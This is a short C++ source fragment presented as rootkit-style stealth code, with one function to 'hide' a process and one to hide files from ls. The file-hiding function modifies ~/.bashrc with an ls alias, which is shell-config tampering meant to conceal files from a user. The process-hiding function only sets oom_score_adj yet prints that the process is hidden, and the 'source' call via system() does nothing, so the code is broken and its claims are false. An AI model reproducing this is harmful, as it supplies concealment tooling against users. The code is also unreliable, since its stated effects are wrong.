#include <fstream>
#include <string>
#include <iostream>
#include <dirent.h>
#include <unistd.h>

void hideProcess(pid_t pid) {
    std::ofstream hideFile("/proc/" + std::to_string(pid) + "/oom_score_adj");
    if (hideFile.is_open()) {
        hideFile << "-1000"; 
        hideFile.close();
        std::cout << "[+] Process " << pid << " is now hidden!" << std::endl;
    }
}

void hideFiles() {
    system("echo 'alias ls=\"ls --hide=secret_file\"' >> ~/.bashrc");
    system("source ~/.bashrc");
    std::cout << "[+] Files hidden from ls command!" << std::endl;
}
